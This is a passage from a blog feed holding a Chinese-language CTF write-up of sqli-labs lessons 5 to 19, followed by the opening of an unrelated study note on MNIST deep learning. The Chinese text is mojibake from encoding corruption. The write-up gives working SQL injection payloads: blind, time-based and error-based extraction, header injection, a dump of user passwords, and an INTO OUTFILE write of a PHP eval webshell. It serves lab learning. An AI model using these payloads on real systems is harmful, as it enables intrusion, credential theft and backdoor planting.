href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+</a></p><hr><ul><li>åˆ—åä»¥æ­¤ç±»æ¨</li></ul><p>å¯ä»¥ç”¨pythonå†™ä¸ªè„šæœ¬æ¥è·‘ï¼Œæˆ–è€…ä½¿ç”¨burpsuite</p><p>å¦å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨updataxml()å‡½æ•°æ¥è·å–ç›¸å…³ä¿¡æ¯</p><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" srcset="data:image/png;base64,666" alt="Gi3aM0.png"></p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+</a></p><hr><h2 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h2><p>ä¸ä¸Šä¸€é“é¢˜ç±»ä¼¼ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·</p><hr><h2 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h2><ul><li>åˆ©ç”¨æ°¸çœŸæ°¸å‡çš„æ¡ä»¶é…åˆandå’Œoråˆ¤æ–­å‚æ•°idçš„é—­åˆæ–¹å¼</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi318m.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi318m.png" srcset="data:image/png;base64,666" alt="Gi318m.png"></p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+</a></p><hr><ul><li>åˆ©ç”¨select xxx into outfile xxx/xxxçš„æ–¹å¼å‘æœåŠ¡å™¨ä¸­å†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" srcset="data:image/png;base64,666" alt="Gi3PX5.png"></p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;</a>)) union select 1,â€™2â€™,â€<?php @eval($_POST['hahaha'];)?>â€œ into outfile â€œ./â€œ â€“+</p><p>ç”±äºä¸çŸ¥é“ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œæ‰€ä»¥ç›®å‰æ— æ³•å¯¹ä¼ å…¥æ–‡ä»¶çš„æˆåŠŸä¸å¦åšå‡ºåˆ¤æ–­</p><hr><h2 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h2><ul><li>åˆ¤æ–­å‚æ•°é—­åˆæ–¹å¼</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" srcset="data:image/png;base64,666" alt="GiXeU9.png"></p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+</a></p><hr><ul><li>ç”±äºæ³¨å…¥é”™è¯¯æ—¶ä¸å›æ˜¾ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„ç›²æ³¨</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXEng.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXEng.png" srcset="data:image/png;base64,666" alt="GiXEng.png"></p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li>å¾€åæ­¥éª¤ä¸ä¸Šè¿°ç›²æ³¨æ­¥éª¤ä¸€è‡´</li></ul><hr><h2 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h2><ul><li>åœ¨åˆ¤æ–­å‚æ•°é—­åˆæ–¹å¼æ—¶ï¼Œå‘ç°å›æ˜¾ä¸æ”¹å˜</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" srcset="data:image/png;base64,666" alt="GiX3qE.png"></p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+</a></p><hr><ul><li>å°è¯•åŸºäºæ—¶é—´çš„ç›²æ³¨</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" srcset="data:image/png;base64,666" alt="GiXxPX.png"></p><p>å¯ä»¥çœ‹åˆ°ç½‘é¡µæ ¹æ®è®¾å®šçš„æ—¶é—´æ­£åœ¨åŠ è½½ï¼Œè¯´æ˜æ³¨å…¥æˆåŠŸ</p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+</a></p><hr><ul><li>æ¥ä¸‹æ¥åªéœ€è¦å°†sleepå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ›¿æ¢ä¸ºpayloadï¼Œå³å¯æ ¹æ®ç½‘é¡µå“åº”æ—¶é—´åˆ¤æ–­ç»“æœ</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"></p><p>payloadå–ä¸Šè¿°ç›²æ³¨payloadçš„æŸ¥è¯¢éƒ¨åˆ†</p><p><strong>payload</strong>ï¼š<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+</a></p><hr><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><ul><li>å°†é—­åˆå‚æ•°çš„å•å¼•å·æ›¿æ¢ä¸ºåŒå¼•å·ï¼Œå…¶ä½™ä¸€è‡´</li></ul><hr><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>è¿™é“é¢˜æ˜¯ä½¿ç”¨postæ–¹å¼æäº¤æ•°æ®çš„ï¼Œåœ¨å¤šæ¬¡å°è¯•ä»¥åŠä¸Šç½‘æ‰¾èµ„æ–™ä¹‹åï¼Œå‘ç°æœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„</p><ul><li>ä¸å¯ä»¥ç›´æ¥å°†urlç¼–ç ä¹‹åçš„æ•°æ®ï¼ˆå¦‚%20ï¼‰ç›´æ¥æäº¤</li><li>æœ€åçš„æ³¨é‡Šä¸å¯ä»¥ç”¨â€œâ€“+â€ï¼Œè€Œåº”è¯¥ç”¨â€œ#â€</li></ul><p><img src="https://www.helloimg.com/images/2021/12/19/GvklDS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvklDS.png" srcset="data:image/png;base64,666" alt="GvklDS.png"></p><p>ä¸Šé¢è¿™æ ·æ³¨é‡Šæ˜¯è¡Œä¸é€šçš„ï¼Œç”¨â€œ#â€ä»£æ›¿â€œâ€“+â€ä¹‹åå¦‚ä¸‹å›¾</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkHao.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkHao.png" srcset="data:image/png;base64,666" alt="GvkHao.png"></p><p>ç„¶åå†ç”¨ä¹‹å‰å†™è¿‡çš„é¢˜å½“ä¸­å‡ºç°çš„è”åˆæ³¨å…¥</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" srcset="data:image/png;base64,666" alt="Gvkigb.png"></p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" srcset="data:image/png;base64,666" alt="GvkbHD.png"></p><hr><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>åŸç†åŒä¸Šä¸€é¢˜ä¸€è‡´ï¼Œå”¯ä¸€å·®åˆ«æ˜¯é—­åˆæ–¹å¼ä¸åŒ</p><p><a href="https://www.helloimg.com/image/GvraLC"><img src="https://www.helloimg.com/images/2021/12/19/GvraLC.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvraLC.png" srcset="data:image/png;base64,666" alt="GvraLC.png"></a></p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" srcset="data:image/png;base64,666" alt="Gvr1NQ.png"></p><hr><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>è¿™é“é¢˜çš„é—­åˆæ–¹å¼ä¸ä¸Šä¸€é“é¢˜ç›®æ¯”è¾ƒç›¸ä¼¼ï¼Œåªä¸è¿‡æŠŠåŒå¼•å·æ›¿æ¢ä¸ºå•å¼•å·ï¼Œæ¯”è¾ƒä¸ä¸€æ ·çš„æ˜¯è¿™é“é¢˜ä¸å¯ä»¥ä½¿ç”¨ä¸Šä¸€é“é¢˜çš„è”åˆæ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå…·ä½“çš„payloadå¯å‚ç…§ä¸Šè¿°é¢˜ç›®æœ‰å…³æŠ¥é”™æ³¨å…¥çš„éƒ¨åˆ†</p><p>ä¸‹å›¾æ˜¯è”åˆæ³¨å…¥åæ— å›æ˜¾çš„ç»“æœ</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" srcset="data:image/png;base64,666" alt="Gvhw7o.png"></p><hr><p>è¿™é‡Œä½¿ç”¨äº†æŠ¥é”™æ³¨å…¥è¿”å›äº†mysqlçš„ç»å¯¹è·¯å¾„</p><p><strong>payload</strong>ï¼š1â€™) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" srcset="data:image/png;base64,666" alt="GvhNBD.png"></p><hr><p>è¿™é‡ŒæŸ¥è¯¢åˆ°äº†å½“å‰çš„æ•°æ®åº“</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" srcset="data:image/png;base64,666" alt="Gvhvnb.png"></p><hr><p>éœ€è¦æ³¨æ„çš„æ˜¯ç”±äºè¿”å›é•¿åº¦çš„é™åˆ¶ï¼Œå›æ˜¾æ— æ³•æ˜¾ç¤ºæ‰€æœ‰çš„ç»“æœï¼Œå¯ä»¥æ ¹æ®payloadä½œç›¸åº”è°ƒæ•´</p><p><strong>payload</strong>ï¼š1â€™) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" srcset="data:image/png;base64,666" alt="GvhdFK.png"></p><hr><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>è¿™é“é¢˜ä¸ä¸Šä¸€é“é¢˜ç±»ä¼¼ï¼Œå”¯ä¸€ä¸åŒçš„ä»æ˜¯é—­åˆæ–¹å¼ä¸åŒ</p><hr><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯postæ–¹å¼çš„åŸºäºæ—¶é—´çš„ç›²æ³¨</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" srcset="data:image/png;base64,666" alt="GQtNsK.png"></p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" srcset="data:image/png;base64,666" alt="GQtvzT.png"></p><p>ä¸€å¼€å§‹ä¾ç„¶å…ˆåˆ¤æ–­é—­åˆæ–¹å¼</p><hr><p>ç„¶åç”¨ifè¯­å¥æ„é€ åŸºäºæ—¶é—´çš„ç›²æ³¨</p><p>è¿™é‡Œæ— éœ€å…³æ³¨æ˜¯å¦ç™»å½•æˆåŠŸï¼Œåªéœ€å…³æ³¨å“åº”æ—¶é—´</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" srcset="data:image/png;base64,666" alt="GQtQvb.png"></p><hr><p>ç„¶åæ ¹æ®ä¸Šè¿°é¢˜ç›®ä¸­æœ‰å…³åŸºäºæ—¶é—´çš„ç›²æ³¨æœ‰å…³çš„é¢˜ç›®çš„payloadè¿›è¡Œæ³¨å…¥</p><p><strong>payload</strong>ï¼š1â€™ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=â€™câ€™),sleep(2),1) #</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" srcset="data:image/png;base64,666" alt="GQt0B1.png"></p><hr><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>è¿™é“é¢˜ä¸ä¸Šä¸€é“é¢˜ç›®å·®ä¸å¤šï¼Œå”¯ä¸€åŒºåˆ«ä»æ˜¯é—­åˆæ–¹å¼ä¸åŒ</p><hr><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>è¿™é“é¢˜æ¶‰åŠåˆ°äº†sqlè¯­å¥ä¸­updateéƒ¨åˆ†ï¼Œæ¨¡æ‹Ÿçš„æ˜¯åœ¨ç™»å½•æˆåŠŸåä¿®æ”¹å¯†ç æ—¶çš„æ³¨å…¥</p><p>è¿™é‡Œç”±äºæ— æ³•å›æ˜¾é—­åˆæ–¹å¼æ˜¯å¦æ­£ç¡®ï¼Œæ•…ä½¿ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨ä¸­çš„å°æŠ€å·§è¿›è¡Œåˆ¤æ–­</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" srcset="data:image/png;base64,666" alt="GQAE1g.png"></p><hr><p>å¾€ä¸‹çš„è¿‡ç¨‹æ¶‰åŠåˆ°<strong>å­æŸ¥è¯¢</strong>çš„æ¦‚å¿µï¼Œå³ä»¥æŸ¥è¯¢çš„ç»“æœä½œä¸ºä¸‹ä¸€æ¬¡æŸ¥è¯¢çš„èŒƒå›´</p><p>æŸ¥æ•°æ®åº“</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" srcset="data:image/png;base64,666" alt="GQAm6P.png"></p><hr><p>å¾€ååªéœ€å°†select database()æ›¿æ¢ä¸ºå…ˆå‰é¢˜ç›®ä¸­ç›¸åº”çš„payloadå³å¯</p><p><a href="https://www.helloimg.com/image/GQALuz"><img src="https://www.helloimg.com/images/2021/12/25/GQALuz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQALuz.png" srcset="data:image/png;base64,666" alt="GQALuz.png"></a></p><hr><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>ä¸€å¼€å§‹ç»™å‡ºäº†æœ¬æœºçš„ipåœ°å€ï¼Œæ„ä¹‰ä¸æ˜ï¼ˆä¼°è®¡æ˜¯æç¤ºå¯ä»¥æ³¨å…¥æŸäº›ç±»å‹çš„ä¿¡æ¯ä»¥æ‰§è¡Œï¼‰</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPBct.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPBct.png" srcset="data:image/png;base64,666" alt="GzPBct.png"></p><p>å†ç»è¿‡å¯¹usernameå’Œpasswordçš„å¤šæ¬¡æ³¨å…¥åå‘ç°æ²¡æœ‰ä»€ä¹ˆæ•ˆæœï¼Œå°è¯•ç™»å½•</p><hr><p><img src="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" srcset="data:image/png;base64,666" alt="GzPR3v.png"></p><p>å¯ä»¥çœ‹å‡ºç™»å½•åå›æ˜¾äº†user agentï¼Œåˆ™å¯ä»¥é€šè¿‡æŠ“åŒ…ä¿®æ”¹user agentçš„æ–¹å¼æ³¨å…¥</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPZME.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPZME.png" srcset="data:image/png;base64,666" alt="GzPZME.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPCru.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPCru.png" srcset="data:image/png;base64,666" alt="GzPCru.png"></p><p><strong>payload</strong>ï¼šâ€™and updatexml(1,concat(0x7e,database(),0x7e),1) or â€˜</p><hr><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>è¿™é“é¢˜ä¸ä¸Šä¸€é“å·®ä¸å¤šï¼Œåªä¸è¿‡ä¿®æ”¹çš„æ˜¯Refererå­—æ®µ</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" srcset="data:image/png;base64,666" alt="GzPJXR.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" srcset="data:image/png;base64,666" alt="GzPxVn.png"></p><p><strong>payload</strong>ï¼šä¸ä¸Šä¸€é“é¢˜ä¸€è‡´</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfã€web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 2</title>
      <link href="2021/11/29/deep_learning_from_scratch_2/"/>
      <url>2021/11/29/deep_learning_from_scratch_2/</url>
      
        <content type="html"><![CDATA[<h2 id="åœ¨â€æ‰‹å†™æ•°å­—è¯†åˆ«â€ä¸­"><a href="#åœ¨â€æ‰‹å†™æ•°å­—è¯†åˆ«â€ä¸­" class="headerlink" title="åœ¨â€æ‰‹å†™æ•°å­—è¯†åˆ«â€ä¸­"></a>åœ¨â€æ‰‹å†™æ•°å­—è¯†åˆ«â€ä¸­</h2><a id="more"></a><ul><li><p>äº†è§£åˆ°äº†mnistæ•°æ®é›†</p></li><li><p>å¯¹è¿ç®—è¿‡ç¨‹ä¸­è¿ç®—çš„å…·ä½“å¯¹è±¡æœ‰ç‚¹é—®é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line">sys.path.append(os.pardir)</span><br><span class="line"><span class="keyword">from</span> dataset.mnist <span class="keyword">import</span> load_mnist</span><br><span class="line"></span><br><span class="line">(x_train, t_train), (x_test, t_test) = load_mnist(flatten=<span class="literal">True</span>, normalize=<span class="literal">False</span>) <span class="comment">#ä¸€å¼€å§‹ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆæ„æ€</span></span><br><span class="line"></span><br><span class="line">print(x_train.shape)</span><br><span class="line">print(t_train.shape)</span><br><span class="line">print(x_test.shape)</span><br><span class="line">print(t_test.shape)</span><br></pre></td></tr></table></figure></li></ul><p>å¯¹äºä»£ç ä¸­å‡ºç°çš„ä¸¤ä¸ªå…ƒç»„ï¼Œä¸€å¼€å§‹ä¸çŸ¥é“ t_train t_test ä»£è¡¨ä»€ä¹ˆï¼Œåœ¨çº ç»“äº†ä¸€æ®µæ—¶é—´åç»ˆäºæ˜ç™½äº†</p><p>x_train æ˜¯è®­ç»ƒç”¨çš„å›¾åƒæ•°æ®</p><p>t_train æ˜¯è®­ç»ƒå›¾åƒçš„è§£ï¼Œå³æ¯ä¸ªå›¾åƒå¯¹åº”çš„æ•°å­—</p><p>x_test æ˜¯ç”¨äºæµ‹è¯•çš„å›¾åƒæ•°æ®</p><p>t_test æ˜¯æµ‹è¯•å›¾åƒçš„è§£ï¼Œå³æ¯ä¸ªå›¾åƒå¯¹åº”çš„æ•°å­—</p><ul><li><p>è®¤è¯†äº†æ­£è§„åŒ–ã€é¢„å¤„ç†å’Œ one-hot è¡¨ç¤ºæ³•</p><p>æ­£è§„åŒ–æŒ‡çš„æ˜¯å°†æ•°æ®è¿›è¡Œè½¬åŒ–ï¼Œå¦‚å¯¹å›¾åƒçš„æ¯ä¸ªåƒç´ æ•°å€¼é™¤ä»¥256ï¼Œä½¿å…¶æ•°å€¼åœ¨0åˆ°1ä¹‹é—´ï¼Œæ–¹ä¾¿åç»­è¿ç®—</p><p>é¢„å¤„ç†ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åœ¨è¿ç®—ä¹‹å‰å¯¹æ•°æ®è¿›è¡Œè½¬æ¢ï¼Œå¦‚æ­£è§„åŒ–ç­‰</p><p>one-hot è¡¨ç¤ºæ³•æ˜¯æŒ‡å¯¹è¿ç®—ç»“æœåªå°† è§£ æ‰€å¯¹åº”çš„å€¼è®¾ä¸º1ï¼Œå³å°† è§£ ä½œä¸ºç´¢å¼•ï¼Œè®¾ç½®è¯¥ç´¢å¼•çš„å€¼ä¸º1ï¼›åœ¨å¯¹å›¾åƒè¿›è¡Œé¢„æµ‹çš„è„šæœ¬ä¸­ï¼Œè·å–è§£çš„è¿‡ç¨‹ä¾¿æ˜¯åŸºäºone-hotè¡¨ç¤ºæ³•çš„ï¼Œå¦‚ä¸‹ p= np.argmax(y)</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    y = predict(network, x[i])</span><br><span class="line">    p= np.argmax(y) <span class="comment"># è·å–æ¦‚ç‡æœ€é«˜çš„å…ƒç´ çš„ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">if</span> p == t[i]:</span><br><span class="line">        accuracy_cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><p>å¦å¤–ï¼Œåœ¨é˜…è¯»åˆ°è®¾è®¡ç¥ç»ç½‘ç»œæ—¶ï¼Œå­¦åˆ°äº†æœ‰å…³è¾“å…¥å±‚å’Œè¾“å‡ºå±‚ä¸æ•°æ®ä¹‹é—´çš„å…³ç³»</p><p>è¾“å…¥å±‚ä¸ºå¾…è®­ç»ƒæ•°æ®çš„å¤§å°ï¼Œå¦‚è®­ç»ƒæ‰‹å†™æ•°å­—è¯†åˆ«æ—¶è¾“å…¥å±‚ä¸º784ï¼Œå³ä¸ºè®­ç»ƒå›¾åƒçš„å¤§å°</p><p>è¾“å‡ºå±‚ä¸ºåˆ†ç±»æ•°ç›®ï¼Œå¦‚è®­ç»ƒçš„æ‰‹å†™æ•°å­—ç»“æœåªæœ‰0åˆ°9åç§å¯èƒ½ï¼Œæ•…å°†è¾“å‡ºå±‚è®¾ä¸ºå</p></li></ul><h2 id="åœ¨â€œä»æ•°æ®ä¸­å­¦ä¹ â€ä¸­"><a href="#åœ¨â€œä»æ•°æ®ä¸­å­¦ä¹ â€ä¸­" class="headerlink" title="åœ¨â€œä»æ•°æ®ä¸­å­¦ä¹ â€ä¸­"></a>åœ¨â€œä»æ•°æ®ä¸­å­¦ä¹ â€ä¸­</h2><ul><li><p>è®¤è¯†äº†è®¸å¤šæ¦‚å¿µ</p><h3 id="ç‰¹å¾é‡"><a href="#ç‰¹å¾é‡" class="headerlink" title="ç‰¹å¾é‡"></a>ç‰¹å¾é‡</h3></li></ul><blockquote><p>ç‰¹å¾é‡æ˜¯æŒ‡å¯ä»¥ä»è¾“å…¥æ•°æ®ä¸­å‡†ç¡®åœ°æå–æœ¬è´¨æ•°æ®çš„è½¬æ¢å™¨ï¼Œé€šå¸¸è¡¨ç¤ºä¸ºå‘é‡å½¢å¼</p></blockquote><p>ç‰¹å¾é‡æ˜¯ç”±äººè®¾è®¡çš„</p><p>ä¸åŒé—®é¢˜å¯¹åº”ä¸åŒç‰¹å¾é‡</p><p>æ·±åº¦å­¦ä¹ ä¸­ç‰¹å¾é‡æ˜¯ç”±æœºå™¨æ¥å­¦ä¹ çš„</p><h3 id="æ³›åŒ–èƒ½åŠ›"><a href="#æ³›åŒ–èƒ½åŠ›" class="headerlink" title="æ³›åŒ–èƒ½åŠ›"></a>æ³›åŒ–èƒ½åŠ›</h3><blockquote><p>æ³›åŒ–èƒ½åŠ›æ˜¯æŒ‡å¤„ç†æœªè¢«è§‚å¯Ÿè¿‡çš„æ•°æ®ï¼ˆä¸åŒ…å«åœ¨è®­ç»ƒæ•°æ®ä¸­çš„æ•°æ®ï¼‰çš„èƒ½åŠ›</p></blockquote><h3 id="è¿‡æ‹Ÿåˆ"><a href="#è¿‡æ‹Ÿåˆ" class="headerlink" title="è¿‡æ‹Ÿåˆ"></a>è¿‡æ‹Ÿåˆ</h3><blockquote><p>åªå¯¹æŸä¸ªæ•°æ®é›†è¿‡åº¦æ‹Ÿåˆçš„çŠ¶æ€ç§°ä¸ºè¿‡æ‹Ÿåˆ</p></blockquote><p>å¯ä»¥ç†è§£ä¸ºè®­ç»ƒçš„æ¨¡å‹åªå¯¹æŸä¸ªæ•°æ®é›†èµ·ä½œç”¨</p><h3 id="æŸå¤±å‡½æ•°"><a href="#æŸå¤±å‡½æ•°" class="headerlink" title="æŸå¤±å‡½æ•°"></a>æŸå¤±å‡½æ•°</h3><blockquote><p>æŸå¤±å‡½æ•°æ˜¯è¡¨ç¤ºç¥ç»ç½‘ç»œæ€§èƒ½çš„â€œæ¶åŠ£ç¨‹åº¦â€çš„æŒ‡æ ‡ï¼Œå³å½“å‰çš„ç¥ç»ç½‘ç»œå¯¹ç›‘ç£æ•°æ®åœ¨å¤šå¤§ç¨‹åº¦ä¸Šä¸æ‹Ÿåˆï¼Œåœ¨å¤šå¤§ç¨‹åº¦ä¸Šä¸ä¸€è‡´</p></blockquote><h3 id="å‡æ–¹è¯¯å·®"><a href="#å‡æ–¹è¯¯å·®" class="headerlink" 